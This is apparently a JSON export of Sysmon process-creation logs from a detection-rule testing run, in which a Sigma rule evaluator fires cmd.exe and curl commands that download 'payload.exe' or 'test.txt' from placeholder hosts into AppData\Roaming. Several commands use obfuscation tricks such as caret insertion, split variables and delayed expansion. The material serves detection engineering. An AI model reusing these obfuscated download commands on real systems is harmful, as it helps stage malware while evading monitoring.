    {
      "row_id": 115,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  http://example.com/payload.exe -o C:\\Users\\thaim\\AppData\\Roaming\\payload.exe",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 203307,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_017.evtx",
      "ParentCommandLine": "cmd.exe /c \"curl http://example.com/payload.exe -o %USERPROFILE%\\AppData\\Roaming\\payload.exe\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-D3BC-6A2E-5D05-000000002C00",
      "ParentProcessId": 8052,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D3BC-6A2E-5E05-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T16:15:56.184344Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:15:56.150",
      "Version": 5
    },
    {
      "row_id": 116,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe /C \"curl http://example.com/payload.exe -o %%USERPROFILE%%\\AppData\\Roaming\\payload.exe\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 203356,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1059.001__t1059.001_018.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D3D4-6A2E-7705-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T16:16:21.005749Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:16:20.973",
      "Version": 5
    },
    {
      "row_id": 117,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  http://example.com/payload.exe -o C:\\Users\\thaim\\AppData\\Roaming\\payload.exe",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 203357,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_018.evtx",
      "ParentCommandLine": "cmd.exe /C \"curl http://example.com/payload.exe -o %USERPROFILE%\\AppData\\Roaming\\payload.exe\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-D3D4-6A2E-7705-000000002C00",
      "ParentProcessId": 2724,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D3D5-6A2E-7805-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T16:16:21.096230Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:16:21.065",
      "Version": 5
    },
    {
      "row_id": 118,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe /c \"curl http://example.local/test.txt -o C:\\Users\\Public\\AppData\\Roaming\\test.txt\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 203402,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1059.001__t1059.001_019.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D3E9-6A2E-8D05-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T16:16:41.405980Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:16:41.364",
      "Version": 5
    },
    {
      "row_id": 119,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  http://example.local/test.txt -o C:\\Users\\Public\\AppData\\Roaming\\test.txt",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 203403,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_019.evtx",
      "ParentCommandLine": "cmd.exe /c \"curl http://example.local/test.txt -o C:\\Users\\Public\\AppData\\Roaming\\test.txt\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-D3E9-6A2E-8D05-000000002C00",
      "ParentProcessId": 9720,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D3E9-6A2E-8E05-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T16:16:41.465312Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:16:41.428",
      "Version": 5
    },
    {
      "row_id": 120,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe /C \"curl http://example.local/test.txt -o C:\\Users\\Public\\AppData\\Roaming\\test.txt\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 203451,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1059.001__t1059.001_020.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D40B-6A2E-A605-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T16:17:15.845262Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:17:15.813",
      "Version": 5
    },
    {
      "row_id": 121,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  http://example.local/test.txt -o C:\\Users\\Public\\AppData\\Roaming\\test.txt",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 203453,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_020.evtx",
      "ParentCommandLine": "cmd.exe /C \"curl http://example.local/test.txt -o C:\\Users\\Public\\AppData\\Roaming\\test.txt\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-D40B-6A2E-A605-000000002C00",
      "ParentProcessId": 7864,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D40B-6A2E-A705-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T16:17:15.931898Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:17:15.908",
      "Version": 5
    },
    {
      "row_id": 122,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe /c \"set A=App&& set D=Data&& cmd /c curl h^ttp://example.local/test.txt -o %%USERPROFILE%%\\%%A%%%%D%%\\Roaming\\test.txt\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 203490,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1059.001__t1059.001_021.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D427-6A2E-B905-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T16:17:43.229568Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:17:43.212",
      "Version": 5
    },
    {
      "row_id": 123,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd  /c curl http://example.local/test.txt -o C:\\Users\\thaim\\%%A%%%%D%%\\Roaming\\test.txt",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 203491,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1059.001__t1059.001_021.evtx",
      "ParentCommandLine": "cmd.exe /c \"set A=App&& set D=Data&& cmd /c curl h^ttp://example.local/test.txt -o %USERPROFILE%\\%A%%D%\\Roaming\\test.txt\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-D427-6A2E-B905-000000002C00",
      "ParentProcessId": 10424,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D427-6A2E-BA05-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T16:17:43.279092Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:17:43.242",
      "Version": 5
    },
    {
      "row_id": 124,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  http://example.local/test.txt -o C:\\Users\\thaim\\AppData\\Roaming\\test.txt",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 203492,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_021.evtx",
      "ParentCommandLine": "cmd  /c curl http://example.local/test.txt -o C:\\Users\\thaim\\%A%%D%\\Roaming\\test.txt",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-D427-6A2E-BA05-000000002C00",
      "ParentProcessId": 10244,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D427-6A2E-BB05-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T16:17:43.347421Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:17:43.317",
      "Version": 5
    },
    {
      "row_id": 125,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe /V:ON /c \"curl http://example.com/payload.exe -o !AppData!\\payload.exe\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 203536,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1059.001__t1059.001_022.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D442-6A2E-D005-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T16:18:10.209234Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:18:10.167",
      "Version": 5
    },
    {
      "row_id": 126,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  http://example.com/payload.exe -o C:\\Users\\thaim\\AppData\\Roaming\\payload.exe",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 203537,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_022.evtx",
      "ParentCommandLine": "cmd.exe /V:ON /c \"curl http://example.com/payload.exe -o !AppData!\\payload.exe\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-D442-6A2E-D005-000000002C00",
      "ParentProcessId": 7944,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D442-6A2E-D105-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T16:18:10.263557Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:18:10.236",
      "Version": 5
    },
    {
      "row_id": 127,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "cmd.exe /V:oN /c \"curl http://example.com/payload.exe -o !AppData!\\payload.exe\"",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Windows Command Processor",
      "EventID": 1,
      "EventRecordID": 203578,
      "FileVersion": "10.0.26100.8521 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=D87E9FA4C7C878F4C1DC8885CEA7F9F0,SHA256=75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9",
      "IMPHASH": "B0F049C014592B156EB1FA857E99CEB9",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "D87E9FA4C7C878F4C1DC8885CEA7F9F0",
      "Opcode": 0,
      "OriginalFileName": "Cmd.Exe",
      "OriginalLogfile": "t1059.001__t1059.001_023.evtx",
      "ParentCommandLine": "python  -m src.sigma_rule_evaluator.cli --execute",
      "ParentImage": "C:\\Users\\thaim\\AppData\\Local\\Programs\\Python\\Python314\\python.exe",
      "ParentProcessGuid": "20525DD1-CF08-6A2E-7403-000000002C00",
      "ParentProcessId": 9080,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D454-6A2E-E605-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "75320A519959CC6D089EA3EBA33C38CACCB7F138A025EA439BC9686CDB79DED4",
      "SystemTime": "2026-06-14T16:18:28.758371Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:18:28.724",
      "Version": 5
    },
    {
      "row_id": 128,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  http://example.com/payload.exe -o C:\\Users\\thaim\\AppData\\Roaming\\payload.exe",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 203580,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_023.evtx",
      "ParentCommandLine": "cmd.exe /V:oN /c \"curl http://example.com/payload.exe -o !AppData!\\payload.exe\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-D454-6A2E-E605-000000002C00",
      "ParentProcessId": 9392,
      "ParentUser": "thaimx\\thaim",
